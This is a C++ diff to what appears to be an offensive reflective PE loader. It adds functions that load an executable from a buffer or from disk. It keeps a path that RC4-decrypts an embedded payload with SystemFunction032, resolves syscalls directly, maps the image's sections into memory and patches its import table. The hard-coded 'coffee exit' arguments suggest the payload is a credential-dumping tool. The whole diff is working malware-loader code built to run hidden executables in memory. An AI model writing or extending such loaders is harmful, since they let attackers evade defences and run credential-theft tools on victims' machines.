@@ -1,4 +1,6 @@
 #include <iostream>
+#include <fstream>
+#include <vector>
 
 #include "Common.h"
 
@@ -6,6 +8,7 @@
 #include "Structs.h"
 #include "Payload.h"
 #include "Hooks.h"
+#include "Loader.h"
 
 bool ResolveSyscalls(
 	_In_	PSYSCALL	pSyscall
@@ -25,31 +28,34 @@ bool ResolveSyscalls(
 	return true;
 }
 
-int Run()
+int RunFromBuffer(
+	_In_reads_bytes_(peSize) const unsigned char* peBuffer,
+	_In_ size_t peSize,
+	_In_ const std::string& peArgs
+)
 {
-	std::string PeArgs = "coffee exit";
+	if (!peBuffer || peSize == 0)
+	{
+		return EXIT_FAILURE;
+	}
+
+	if (!InitArgs(const_cast<char*>(peArgs.c_str())))
+	{
+		return EXIT_FAILURE;
+	}
 
     SYSCALL SyscallList = { 0 };
-    ResolveSyscalls(&SyscallList);
+    if (!ResolveSyscalls(&SyscallList))
+	{
+		return EXIT_FAILURE;
+	}
 
+	PIMAGE_NT_HEADERS pPayloadNtHeaders = Win32::RtlGetImageNtHeaders(const_cast<unsigned char*>(peBuffer));
+	if (!pPayloadNtHeaders)
+	{
+		return EXIT_FAILURE;
+	}
 
-	InitArgs(const_cast<char*>(PeArgs.c_str()));
-
-	USTRING uKey = { 0 };
-	USTRING uPayload = { 0 };
-
-	void* peContent = RemovePadding(reinterpret_cast<unsigned char*>(&payload), sizeof(payload), REAL_SIZE);
-
-	uPayload.Buffer = reinterpret_cast<unsigned char*>(peContent);
-	uPayload.Length = uPayload.MaximumLength = REAL_SIZE;
-
-	uKey.Buffer = reinterpret_cast<unsigned char*>(&key);
-	uKey.Length = uKey.MaximumLength = 16;
-
-
-	SystemFunction032(&uPayload, &uKey);
-
-	PIMAGE_NT_HEADERS pPayloadNtHeaders = Win32::RtlGetImageNtHeaders(peContent);
 	size_t			peImageSize = pPayloadNtHeaders->OptionalHeader.SizeOfImage;
 	void* MemoryPeAddr = nullptr;
 
@@ -67,7 +73,7 @@ int Run()
 #endif
 
 	// Copy section
-	Reflective::CopySections(MemoryPeAddr, pPayloadNtHeaders, peContent);
+	Reflective::CopySections(MemoryPeAddr, pPayloadNtHeaders, const_cast<unsigned char*>(peBuffer));
 
 	// IAT Patch
 	if (!Reflective::ProcessImportTable(MemoryPeAddr, pPayloadNtHeaders))
@@ -138,6 +144,55 @@ int Run()
 
 }
 
+int RunFromFile(
+	_In_ const std::string& pePath,
+	_In_opt_ const std::string& peArgs
+)
+{
+	std::ifstream peFile(pePath, std::ios::binary | std::ios::ate);
+	if (!peFile.is_open())
+	{
+		return EXIT_FAILURE;
+	}
+
+	std::streamsize fileSize = peFile.tellg();
+	if (fileSize <= 0)
+	{
+		return EXIT_FAILURE;
+	}
+
+	peFile.seekg(0, std::ios::beg);
+
+	std::vector<unsigned char> peBuffer(static_cast<size_t>(fileSize));
+	if (!peFile.read(reinterpret_cast<char*>(peBuffer.data()), fileSize))
+	{
+		return EXIT_FAILURE;
+	}
+
+	std::string commandLine = peArgs.empty() ? pePath : pePath + " " + peArgs;
+	return RunFromBuffer(peBuffer.data(), peBuffer.size(), commandLine);
+}
+
+int Run()
+{
+	std::string peArgs = "coffee exit";
+
+	USTRING uKey = { 0 };
+	USTRING uPayload = { 0 };
+
+	void* peContent = RemovePadding(reinterpret_cast<unsigned char*>(&payload), sizeof(payload), REAL_SIZE);
+
+	uPayload.Buffer = reinterpret_cast<unsigned char*>(peContent);
+	uPayload.Length = uPayload.MaximumLength = REAL_SIZE;
+
+	uKey.Buffer = reinterpret_cast<unsigned char*>(&key);
+	uKey.Length = uKey.MaximumLength = 16;
+
+	SystemFunction032(&uPayload, &uKey);
+
+	return RunFromBuffer(uPayload.Buffer, uPayload.Length, peArgs);
+}
+
 
 #ifdef DLL
 
@@ -178,7 +233,7 @@ __declspec(dllexport) bool WINAPI DllMain
 	return true;
 }
 
-#else
+#elif !defined(NODE_ADDON_BUILD)
 
 int main()
 {
